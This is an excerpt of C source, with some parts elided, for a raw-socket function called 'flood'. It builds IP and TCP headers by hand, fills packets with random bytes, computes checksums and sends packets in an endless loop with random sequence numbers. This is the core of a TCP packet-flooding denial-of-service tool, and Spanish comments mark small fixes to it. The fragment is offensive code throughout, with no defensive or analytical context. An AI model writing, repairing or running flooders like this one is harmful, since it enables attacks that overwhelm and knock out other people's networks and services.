...
void *flood(void *par1)
{
    ...
    {
        *(char *)++data = (char)(rand() & 0xFF);
    }

    ipHeader->ihl = 5;
    ipHeader->version = 4;
    ipHeader->tos = 0;
    ipHeader->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + randomLength);
    ipHeader->id = htons(54321); // <-- Corregido aquí
    ipHeader->frag_off = 0;
    ipHeader->ttl = 111;
    ipHeader->protocol = 6;
    ipHeader->check = 0;
    ...
    ipHeader->check = csum((unsigned short *)datagram, sizeof(struct iphdr) + sizeof(struct tcphdr) + randomLength);
    ...
    while (1)
    {
        if (packetCounter > 1000)
        {
            ...
            memset((char *)&target, 0, sizeof(target)); // <-- Usar memset en vez de bzero
        ...
        tcpHeader->seq = htonl(rand_cmwc() & 0xFFFFFFFF);
